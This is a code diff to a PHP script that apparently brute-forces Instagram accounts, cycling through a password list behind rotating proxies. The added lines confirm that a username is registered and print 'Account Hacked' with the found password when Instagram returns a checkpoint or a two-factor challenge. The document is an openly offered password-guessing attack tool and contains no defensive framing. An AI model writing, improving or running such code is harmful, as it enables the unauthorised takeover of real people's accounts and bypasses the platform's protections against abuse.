@@ -32,6 +32,7 @@ $response_cod == "HTTP/1.1 404 Not Found" ? exit("\n\033[31m[!] \033[0mThe usern
 $pass_get == null ? exit("\n\033[31m[!] \033[0mPassword list is empty or doesn't exist, add some passwords to it! \n\n") : ''; // check if pass list contains passwords
 $proxies == null ? exit("\n\033[31m[!] \033[0mProxy list is empty or doesn't exist, the script won't work without proxies! \n\n") : ''; // check if proxy list contains proxies
 
+echo "\n\033[32m[!]\033[0m Username [".$username."] is registered on Instagram! \n";
 echo "\n\033[32m[!]\033[0m Password and Proxy list loaded succesfully! \n";
 echo "\n\033[32m[!]\033[0m ".count($passwords)." passwords have been loaded. \n";
 echo "\n\033[32m[!]\033[0m Starting the attack...\n\n";
@@ -129,6 +130,9 @@ foreach ($passwords as $password) {
 		$status = $json_o->status;
 
 		if ($json_o->message == "checkpoint_required") {
+			echo "\n\033[32m[Success!]\033[0m Account Hacked [Username: \033[36m$username \033[0m| Password: \033[36m$password\033[0m] \n\n";
+			exit("\033[33mThe account has a checkpoint, it's necessary to receive a code through SMS or E-mail.\033[0m \n\n");
+		} elseif ($json_o->two_factor_required == true) {
 			echo "\n\033[32m[Success!]\033[0m Account Hacked [Username: \033[36m$username \033[0m| Password: \033[36m$password\033[0m] \n\n";
 			exit("\033[33mThe account has a checkpoint, it's necessary to receive a code through SMS or E-mail.\033[0m \n\n");
 		} elseif ($status == "fail") {
